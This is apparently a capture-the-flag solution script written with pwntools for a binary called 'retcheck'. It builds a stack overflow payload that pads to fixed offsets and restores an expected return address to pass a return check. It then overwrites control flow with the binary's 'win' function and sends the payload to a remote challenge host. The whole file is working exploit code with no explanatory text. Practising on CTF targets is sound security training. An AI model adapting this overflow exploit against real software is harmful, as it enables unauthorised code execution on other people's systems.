from pwn import *

elf = ELF('retcheck')
context.update(os='linux', arch='amd64', binary=elf)

host = 'challenge.ctf.games'
port = 31463

if args.LOCAL:
	p = elf.process()
else:
	p = remote(host, port)

offset1 = 408
offset2 = 424
ret_addr = 0x401465

payload = b'A' * offset1
payload += p64(ret_addr)
payload += b'A' * (offset2 - len(payload))
payload += p64(elf.symbols['win'])

with open('payload', 'wb') as fp:
	fp.write(payload + b'\n')

p.sendline(payload)

p.interactive()

